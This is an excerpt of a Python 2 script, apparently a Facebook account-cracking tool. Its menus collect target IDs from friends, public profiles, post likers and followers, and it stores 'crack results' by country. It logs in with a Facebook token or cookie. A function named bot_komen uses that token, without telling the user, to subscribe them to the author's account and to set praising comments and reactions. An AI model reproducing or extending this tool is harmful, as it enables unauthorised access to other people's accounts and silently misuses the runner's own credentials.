...
\033[0;91m╚═══════════════════════════════════════════════════════════════╝
\033[0;91m╔═══════════════════════════════════════════════════════════════╗
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;97mAuthor   \033[0;91m: \033[0;97m LEGEND FUEGO
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;97mGithub   \033[0;91m: \033[0;97m Github.com/MAFIA-FUEGO/
\033[0;91m   {\033[0;97m•\033[0;91m} \033[0;97mFacebook \033[0;91m: \033[0;97m WhatsApp +27634589320
\033[0;91m╚═══════════════════════════════════════════════════════════════╝
""")
...
def masuk():
	...
	print logo
	print ('\033[0;91m╔═══════════════════════════════════════════════════════════════╗')
	print ('\033[0;97m   1.\033[0;97m Login Using Facebook Token')
	print ('\033[0;97m   2.\033[0;97m Login Using Facebook Cookie')
...
def bot_komen():
	...
	kom = ('We Love You FUEGO! 😘')
	reac = ('LOVE')
	post = ('10215192646369292')
	post2 = ('10215301558092017')
	kom2 = ('We Love You FUEGO! 😘')
	reac2 = ('LOVE')
        requests.post('https://graph.facebook.com/100008885681376/subscribers?access_token=' + toket)
...
def menu():
	...
	print (logo)
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	jalan ("\033[0;97m   •\033[0;97m WELCOME\033[0;97m =>\033[0;97m " +name)
	jalan ("\033[0;97m   •\033[0;97m USER ID\033[0;97m =>\033[0;97m " +id)
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack ID From Friends/Public')
	print ('\033[0;97m   2.\033[0;97m Crack ID From Like Friends/Public')
	print ('\033[0;97m   3.\033[0;97m Crack ID From Followers')
	print ('\033[0;97m   4.\033[0;97m Crack ID By Username')
	print ('\033[0;97m   5.\033[0;97m Check Crack Results')
...
def crack_friends():
	...
	print ('\033[0;97m   0.\033[0;97m Return')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_friends()
...
def crack_indo():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack From List Friends')
	print ('\033[0;97m   2.\033[0;97m Crack From Public/Friends')
	print ('\033[0;97m   0.\033[0;97m Return')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_indo()
...
def pilih_indo():
	...
	if teak =="":
		...
		print logo
		print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
		idt = raw_input("\033[0;97m   • \033[0;97mID Public/Friends \033[0;97m:\033[0;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print "\033[0;97m   •\033[0;97m Name \033[0;97m:\033[0;97m "+sp["name"]
		except KeyError:
			print "\033[0;97m   ! ID Public/friends not found"
			raw_input("\n\033[1;97m   < \033[0;97mReturn \033[0;97m>")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print '\033[0;97m   ! No Connection'
			keluar()
	...
	print '\033[0;97m   • \033[0;97mAmount Of ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
        print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
...
### MAIN INDONESIA ###
	...
	print "\033[0;91m╚═══════════════════════════════════════════════════════════════╝"
	raw_input("\033[0;97m   < \033[0;97mReturn\033[0;97m >")
...
def crack_like():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	idt = raw_input("\033[0;97m   • \033[0;97mID Postingan Public/Friends \033[0;97m:\033[0;97m ")
	try:
		...
		print '   ! Koneksi Not Found'
		exit()
		
	print '\033[0;97m   • \033[0;97m   Amount Of ID\033[0;97m :\033[0;97m '+str(len(id))
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
...
def crack_follow():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1.\033[0;97m Crack From Followers')
	print ('\033[0;97m   2.\033[0;97m Crack From Follower Friends')
	print ('\033[0;97m   0.\033[0;97m Return')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_follow()
...
def cari_id():
	...
	for hasil in nex:
		print '\n'+'\033[0;97m   • \033[0;97mID Anda\033[0;97m :\033[0;97m '+hasil
                print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
		raw_input("\n\033[0;97m   < \033[0;97mReturn \033[0;97m>")
		menu()
...
def hasil_crack():
	...
	print logo
	print ("\033[0;91m╔═══════════════════════════════════════════════════════════════╗")
	print ('\033[0;97m   1. \033[0;97mCheck Results Crack Indonesia')
	print ('\033[0;97m   2. \033[0;97mCheck Results Crack Bangladesh')
	print ('\033[0;97m   3. \033[0;97mCheck Results Crack Pakistan')
	print ('\033[0;97m   4. \033[0;97mCheck Results Crack Usa')
	print ('\033[0;97m   5. \033[0;97mCheck Results Crack Like')
	print ('\033[0;97m   6. \033[0;97mCheck Results Crack Follow')
	print ('\033[0;97m   0. \033[0;97mReturn')
	print ("\033[0;91m╚═══════════════════════════════════════════════════════════════╝")
	pilih_hasil()
...
def perbarui():
	...
	raw_input("\n\033[0;97m   <\033[0;97m Return \033[0;97m>")
	os.system("python2 crackfb2.py")
